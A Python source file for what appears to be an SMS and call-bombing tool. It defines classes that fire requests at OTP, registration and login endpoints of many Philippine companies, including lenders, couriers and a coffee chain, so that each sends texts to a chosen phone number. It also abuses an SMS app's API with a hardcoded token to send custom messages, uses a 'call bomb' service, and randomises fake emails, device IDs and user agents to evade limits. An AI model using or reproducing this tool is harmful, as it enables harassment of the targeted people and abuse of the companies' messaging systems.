import aiohttp
import json
import random
import string
from core.base_service import BaseService
from utils.config import config

class CustomSMSService(BaseService):
    def __init__(self, sender_name="User", message="Test Message"):
        super().__init__("CUSTOM_SMS")
        self.sender_name = sender_name
        self.message = message

    def _random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        normalized_number = self.normalize_phone(phone)
        suffix = '-freed0m'
        credits = '\n\nCreated by: ANTRAX'
        
        final_text = self.message
        if not final_text.endswith(suffix):
            final_text = f"{final_text} {suffix}"
        final_text = f"{final_text}{credits}"

        command_array = [
            'free.text.sms', '421', normalized_number, '2207117BPG',
            'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
            final_text
        ]

        data = {
            'UID': self._random_string(28),
            'humottaee': 'Processing',
            'Email': f"{self._random_string(8)}@gmail.com",
            '$Oj0O%K7zi2j18E': json.dumps(command_array),
            'device_id': self._random_string(16),
            'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
            'Name': self.sender_name
        }

        headers = {
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        from urllib.parse import urlencode
        return await self._post(session, 'https://sms.m2techtronix.com/v13/sms.php', data=urlencode(data), headers=headers)

class EzLoanService(BaseService):
    def __init__(self):
        super().__init__("EZLOAN")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        data = {
            "businessId": "EZLOAN",
            "contactNumber": phone,
            "appsflyerIdentifier": "1760444943092-3966994042140191452"
        }
        return await self._post(session, 'https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=data)

class XpressService(BaseService):
    def __init__(self):
        super().__init__("XPRESS")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        import time
        data = {
            "FirstName": "user",
            "LastName": "test",
            "Email": f"user{int(time.time() * 1000)}@gmail.com",
            "Phone": self.normalize_phone(phone),
            "Password": "Pass1234",
            "ConfirmPassword": "Pass1234",
            "FingerprintVisitorId": config.FINGERPRINT_VISITOR_ID,
            "FingerprintRequestId": config.FINGERPRINT_REQUEST_ID,
        }
        headers = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json"}
        return await self._post(session, "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", headers=headers, json=data)

class AbensonService(BaseService):
    def __init__(self):
        super().__init__("ABENSON")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        data = {"contact_no": phone, "login_token": "undefined"}
        headers = {'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded'}
        return await self._post(session, 'https://api.mobile.abenson.com/api/public/membership/activate_otp', headers=headers, data=data)

class ExcellentLendingService(BaseService):
    def __init__(self):
        super().__init__("EXCELLENT_LENDING")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        coord = random.choice([{"lat": "14.5995", "long": "120.9842"}, {"lat": "14.6760", "long": "121.0437"}])
        agent = random.choice(['okhttp/4.12.0', 'okhttp/4.9.2'])
        data = {"domain": phone, "cat": "login", "previous": False, "financial": "efe35521e51f924efcad5d61d61072a9"}
        headers = {'User-Agent': agent, 'Content-Type': 'application/json; charset=utf-8', 'x-latitude': coord["lat"], 'x-longitude': coord["long"]}
        return await self._post(session, 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock', headers=headers, json=data)

class FortunePayService(BaseService):
    def __init__(self):
        super().__init__("FORTUNE_PAY")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        p = phone.replace('0', '', 1) if phone.startswith('0') else phone
        data = {
            "deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
            "deviceType": "GOOGLE_PLAY",
            "companyId": "4bf735e97269421a80b82359e7dc2288",
            "dialCode": "+63",
            "phoneNumber": p
        }
        headers = {'User-Agent': 'Dart/3.6 (dart:io)', 'Content-Type': 'application/json', 'app-type': 'GOOGLE_PLAY', 'authorization': 'Bearer'}
        return await self._post(session, 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', headers=headers, json=data)

class WeMoveService(BaseService):
    def __init__(self):
        super().__init__("WEMOVE")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        p = phone.replace('0', '', 1) if phone.startswith('0') else phone
        data = {"phone_country": "+63", "phone_no": p}
        headers = {'User-Agent': 'okhttp/4.9.3', 'Content-Type': 'application/json', 'xuid_type': 'user', 'source': 'customer', 'authorization': 'Bearer'}
        return await self._post(session, 'https://api.wemove.com.ph/auth/users', headers=headers, json=data)

class LBCService(BaseService):
    def __init__(self):
        super().__init__("LBC")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        p = phone.replace('0', '', 1) if phone.startswith('0') else phone
        data = {
            "verification_type": "mobile",
            "client_email": f"{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com",
            "client_contact_code": "+63",
            "client_contact_no": p,
            "app_log_uid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
        }
        headers = {'User-Agent': 'Dart/2.19 (dart:io)', 'Content-Type': 'application/x-www-form-urlencoded'}
        return await self._post(session, 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', headers=headers, data=data)

class PickupCoffeeService(BaseService):
    def __init__(self):
        super().__init__("PICKUP_COFFEE")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        data = {"mobile_number": self.normalize_phone(phone), "login_method": "mobile_number"}
        headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
        return await self._post(session, 'https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=data)

class HoneyLoanService(BaseService):
    def __init__(self):
        super().__init__("HONEY_LOAN")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        data = {"phone": phone, "is_rights_block_accepted": 1}
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json'}
        return await self._post(session, 'https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=data)

class KomoService(BaseService):
    def __init__(self):
        super().__init__("KOMO_PH")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        headers = {
            'Content-Type': 'application/json',
            'Signature': config.KOMO_SIGNATURE,
            'Ocp-Apim-Subscription-Key': config.KOMO_SUBSCRIPTION_KEY
        }
        data = {"mobile": phone, "transactionType": 6}
        return await self._post(session, 'https://api.komo.ph/api/otp/v5/generate', headers=headers, json=data)

class S5Service(BaseService):
    def __init__(self):
        super().__init__("S5_OTP")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
            'content-type': 'multipart/form-data;',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        body = f"phone_number={self.normalize_phone(phone)}"
        return await self._post(session, 'https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body)

class CallBombService(BaseService):
    def __init__(self):
        super().__init__("CALL_BOMB")

    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
        num = self.normalize_phone(phone)
        if not num.startswith('+63'): return False
        headers = {'Content-Type': 'application/json'}
        data = {"phone": num}
        try:
            async with session.post("https://call-bomb.onrender.com/", json=data, headers=headers) as response:
                if response.status == 200:
                    res = await response.json()
                    return res.get('success', False)
        except Exception:
            pass
        return False

def get_default_services():
    return [
        CustomSMSService(), EzLoanService(), XpressService(), AbensonService(),
        ExcellentLendingService(), FortunePayService(), WeMoveService(),
        LBCService(), PickupCoffeeService(), HoneyLoanService(),
        KomoService(), S5Service(), CallBombService()
    ]
